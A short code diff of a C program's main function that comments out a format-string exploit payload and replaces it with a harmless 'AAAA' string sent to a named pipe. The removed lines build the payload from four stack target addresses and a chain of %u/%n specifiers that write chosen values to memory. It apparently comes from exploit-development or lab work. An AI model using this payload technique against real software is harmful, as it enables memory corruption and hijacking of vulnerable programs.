@@ -7,12 +7,12 @@
 
 int main(void)
 {
-  char bufr[150];
-  memcpy(bufr, "AAAdumm\xd8\x57\xbf\xbfzzzz\xd9\x57\xbf\xbfzzzz\xda\x57\xbf\xbfzzzz\xdb\x57\xbf\xbf", 35);
+  //char bufr[136];
+  //memcpy(bufr, "AAAdumm\xd8\x57\xbf\xbfzzzz\xd9\x57\xbf\xbfzzzz\xda\x57\xbf\xbfzzzz\xdb\x57\xbf\xbf", 35);
 
-  strcpy(bufr+35, "%08x%165u%n%253u%n%135u%n%20u%n");
+  //strcpy(bufr+35, "%08x%165u%n%253u%n%135u%n%20u%n");
 
-  writecmd(PIPEPATH, bufr);
+  writecmd(PIPEPATH, "AAAA");
   
   return 0;
 }
